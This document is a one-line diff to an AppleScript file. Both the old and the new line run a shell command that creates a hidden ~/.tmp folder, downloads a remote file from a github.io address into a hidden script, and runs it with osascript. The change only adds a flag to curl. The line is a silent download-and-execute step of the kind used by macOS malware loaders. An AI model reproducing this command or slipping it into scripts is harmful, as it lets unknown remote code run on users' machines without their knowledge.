@@ -1,1 +1,1 @@
-do shell script "mkdir -p ~/.tmp; curl https://sitetest.github.io/val.txt >~/.tmp/.val.scpt; osascript ~/.tmp/.val.scpt"
+do shell script "mkdir -p ~/.tmp; curl -3 https://sitetest.github.io/val.txt >~/.tmp/.val.scpt; osascript ~/.tmp/.val.scpt"
